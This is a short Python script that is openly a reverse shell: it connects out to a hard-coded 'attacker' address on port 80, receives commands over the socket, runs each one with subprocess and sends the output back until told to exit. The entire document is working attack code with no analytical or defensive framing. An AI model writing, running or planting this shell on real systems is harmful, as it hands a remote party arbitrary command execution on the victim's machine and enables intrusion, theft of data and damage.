# Modules
import sys
import socket
import subprocess
import os


#varviables
IP = "192.168.0.228"
PORT = 80
BUFFER_SIZE = 1024

# Connect to the attacker
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((IP, PORT))

#Getting command, and sending it to the attacker
while True:
  command = s.recv(BUFFER_SIZE).decode()
  output = subprocess.getoutput(command)
  if command.lower() == "exit":
    print("[!] Exited...")
    sys.exit()
  s.send(output.encode())

